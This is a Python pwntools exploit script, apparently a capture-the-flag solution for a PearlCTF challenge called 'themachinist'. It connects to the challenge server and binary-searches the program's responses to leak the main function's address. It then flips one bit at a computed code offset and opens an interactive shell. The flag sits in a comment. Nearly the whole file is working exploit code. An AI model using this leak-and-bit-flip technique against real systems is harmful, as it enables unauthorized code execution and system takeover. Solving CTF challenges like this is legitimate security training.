#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./themachinist_patched")

context.binary = exe

REMOTE_NC_CMD    = " nc dyn.ctf.pearlctf.in 30022 "    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()

    def binary_search(l,ri):
        mid = (l+ri)//2
        print(hex(mid))

        r.sendline(bstr(mid))
        r.recvuntil(b"Enter your sauce recipe: ")
        res = r.recvline()

        if b"got it right" in res:
            log.info(f'Main @{hex(mid)}')
            exe.address = mid - 0x12e9
            return

        if b"bland" in res:
            l=mid+1
        if b"overdone" in res:
            ri=mid-1
        binary_search(l,ri)

    r.sendline(b"1")
    binary_search(0, 2**64)

    BIT_FLIP = exe.address + 0x1765

    print(hex(BIT_FLIP))

    def write_bit(add, value):
        #gdb.attach(r)
        r.sendline(b"2")
        r.sendline(bstr(hex(add)))
        r.sendline(bstr(value))
        r.sendline(b"r")
    
    write_bit(BIT_FLIP,0)
    r.sendline(b"3")
    r.interactive()
    #pearl{pwn1ng_by_fl1pp1ng_1_bit?}

if __name__ == "__main__":
    main()